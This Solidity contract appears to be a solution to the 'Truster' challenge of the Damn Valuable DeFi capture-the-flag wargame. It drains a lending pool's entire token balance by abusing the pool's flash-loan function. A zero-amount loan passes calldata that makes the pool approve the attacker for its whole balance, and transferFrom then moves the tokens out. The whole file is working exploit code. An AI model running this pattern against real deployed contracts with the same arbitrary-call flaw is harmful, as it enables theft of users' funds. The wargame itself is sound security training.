// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";

contract Attacker {
    using Address for address payable;

    IERC20 public immutable damnValuableToken;
    TrusterLenderPool pool;

    constructor(address tokenAddress, address poolAddress) {
        damnValuableToken = IERC20(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
    }

    function attack(address _address) public {
        uint256 amountToSteal = damnValuableToken.balanceOf(address(pool));

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amountToSteal);

        pool.flashLoan(0, _address, address(damnValuableToken), data);

        damnValuableToken.transferFrom(address(pool), _address, amountToSteal);
    }
}
